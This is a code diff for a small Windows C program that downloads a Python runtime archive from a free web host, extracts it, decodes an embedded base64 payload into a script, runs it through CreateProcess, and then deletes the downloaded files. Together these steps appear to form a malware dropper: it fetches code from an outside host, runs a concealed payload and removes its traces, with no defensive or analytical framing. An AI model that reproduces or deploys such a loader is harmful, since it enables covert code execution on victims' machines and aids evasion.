@@ -101,14 +101,6 @@ static void untar(FILE *a, const char *path)
 		}
 		filesize = parseoct(buff + 124, 12);
 		switch (buff[156]) {
-		case '1':
-			break;
-		case '2':
-			break;
-		case '3':
-			break;
-		case '4':
-			break;
 		case '5':
 			create_dir(buff, parseoct(buff + 100, 8));
 			filesize = 0;
@@ -241,12 +233,37 @@ int extract()
 	return (0);
 }
 
+int prcs()
+{
+    PROCESS_INFORMATION ProcessInfo;
+    STARTUPINFO StartupInfo;
+    char cmdArgs[] = " py\\main.py";
+    ZeroMemory(&StartupInfo, sizeof(StartupInfo));
+    StartupInfo.cb = sizeof StartupInfo ;
+
+    if(CreateProcess("py\\python.exe", cmdArgs, 
+        NULL,NULL,FALSE,0,NULL,
+        NULL,&StartupInfo,&ProcessInfo))
+    { 
+        WaitForSingleObject(ProcessInfo.hProcess,INFINITE);
+        CloseHandle(ProcessInfo.hThread);
+		CloseHandle(ProcessInfo.hProcess);
+    }  
+    else
+    {
+        printf("The process could not be started...");
+    }
+
+    return 0;
+}
+
+
 int main()
 {
 	dld("https://limitles-rodents.000webhostapp.com/py.tar","py.tar");
 	extract();
-	wrt_data("py\\test.py",base64_decode(IN));
-	int prc = system("py\\python.exe py\\test.py");
+	wrt_data("py\\main.py",base64_decode(IN));
+	int run = prcs();
 	remove_directory("py");
 	remove("py.tar");
 }
